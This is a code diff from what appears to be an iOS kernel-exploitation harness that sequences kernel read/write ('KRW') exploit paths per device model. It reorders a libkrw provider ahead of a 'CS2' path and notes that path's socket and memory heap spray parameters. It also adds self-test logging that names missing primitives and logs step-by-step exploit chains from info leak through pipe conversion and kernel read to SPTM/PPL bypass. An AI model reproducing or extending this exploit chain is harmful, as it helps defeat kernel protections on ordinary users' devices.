@@ -117,8 +117,18 @@
         [LabLearn recordPath:@"p149" result:r149 evidence:@"KERNEL P149"];
         L([NSString stringWithFormat:@"PATH_TEST id=p149 class=conversion result=%@", r149]);
     } else if (sku == LabSkuA14_21D50 || sku == LabSkuA13_22G100) {
-        L(@"[*] 12 mini / A13: 43748 not live. KRW door is CS2 then libkrw.");
+        L(@"[*] 12 mini / A13: 43748 not live. KRW door is libkrw first, CS2 fallback (train-gated).");
         P007Board *bb = [P007Board shared];
+        /* ORDER MATTERS (2026-11-07 rig panics): a jailbroken rig already
+           has a live libkrw provider. Asking CS2 first fires the 22528-socket
+           + 8x128MiB ClearSword spray on a device that never needed it and
+           turned KERNEL/Full Chain into a panic instead of a respring. */
+        if (!bb.hasKread) {
+            bool armed = P007LaneArmBoard();
+            L([NSString stringWithFormat:@"[*] libkrw P007LaneArmBoard %@",
+               armed ? @"YES (provider lane live — no CS2 spray this boot)"
+                     : @"miss (no provider; CS2 fallback next)"]);
+        }
         if (!bb.hasKread) {
             NSString *cs = nil;
             @try { cs = [CS2Runner runUpstream]; }
@@ -127,11 +137,6 @@
                 NSUInteger n = cs.length > 240 ? 240 : cs.length;
                 L([cs substringToIndex:n]);
             }
-        }
-        if (!bb.hasKread) {
-            bool armed = P007LaneArmBoard();
-            L([NSString stringWithFormat:@"[*] libkrw P007LaneArmBoard %@",
-               armed ? @"YES" : @"miss (stock / no provider)"]);
         }
     } else if (LabSkuIsA12X(sku)) {
         P007Board *disc = [P007Board shared];
@@ -164,6 +169,21 @@
     [LabLearn recordPath:@"kread" result:rk evidence:@"KERNEL kread"];
     L([NSString stringWithFormat:@"PATH_TEST id=kread result=%@", rk]);
     P007Board *b = [P007Board shared];
+    NSString *missing = @"none — kread32(kbase)==0xfeedfacf";
+    if (!b.hasKread) {
+        if (sku == LabSkuA14_23F77)
+            missing = @"rw_inpcb KVA after conversion (SocketKRW.Arm)";
+        else if (sku == LabSkuT8150_24A435 || sku == LabSkuT8150_other)
+            missing = @"SPTM-safe rw_inpcb / P110 slot; P149 receipt is not KRW";
+        else if (sku == LabSkuA14_21D50 || sku == LabSkuA13_22G100)
+            missing = @"a live lane: libkrw absent and CS2 train-gated/offsets unproven";
+        else if (LabSkuIsA12X(sku))
+            missing = @"PPL-safe write/convert; CS2 phys_oob is catalog-solo — next door IOSurface p154";
+        else
+            missing = @"no KRW door mapped for this SKU (ident only)";
+    }
+    L([NSString stringWithFormat:@"KERNEL SELF-TEST: %@ — %@",
+       b.hasKread ? @"PASS" : @"FAIL", missing]);
     L([NSString stringWithFormat:@"[*] board hasKread=%@ kbase=0x%llx",
        b.hasKread ? @"YES" : @"NO", (unsigned long long)b.kbase]);
     L(@"=== KERNEL T1 END ===");
@@ -175,7 +195,7 @@
         L(@"[*] 17 FORMULA: leak(P114) → write(P142 prepare-then-overshoot inside P149) → convert(P149 pipes) → kread32(kbase)==0xfeedfacf → sptm(HOLD)");
         L(@"[*] PIPE-HIT / QUEUE-INIT is a write receipt, not kread32. P110 catalog-solo. AfterKread HOLD.");
     } else if (sku == LabSkuA14_21D50 || sku == LabSkuA13_22G100) {
-        L(@"[*] 12 mini / A13 FORMULA: CS2/libkrw → kread32 → AfterKread FIRE. Staging files ≠ jailbreak.");
+        L(@"[*] 12 mini / A13 FORMULA: libkrw (provider) → CS2 fallback → kread32 → AfterKread FIRE. Staging files ≠ jailbreak.");
     } else if (LabSkuIsA12X(sku)) {
         L(@"[*] A12X FORMULA: disclose(P010/P063 via P139) → CS2 phys_oob READ (catalog) → convert unnamed → SocketKRW.Arm(rw_inpcb) → kread32 → PPL AfterKread.");
         L(@"[*] 254 remaining-fire is not this chain. PPL-only is AfterKread, not first KRW.");
